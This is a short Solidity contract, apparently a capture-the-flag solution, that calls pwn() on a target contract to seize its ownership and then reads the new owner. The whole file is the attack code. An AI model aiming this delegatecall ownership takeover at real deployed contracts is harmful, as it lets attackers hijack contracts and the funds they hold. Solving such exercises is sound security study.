// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface  IDelegation {
    function pwn() external ;
    function owner() external returns (address);
}

contract DelegationAttack {
    IDelegation delegation;

    constructor( address _delegation) {
      delegation = IDelegation(_delegation);
    }

    function attack() public {
      delegation.pwn();
    }

    function getOwner() public returns (address) {
       return  delegation.owner();
    }
}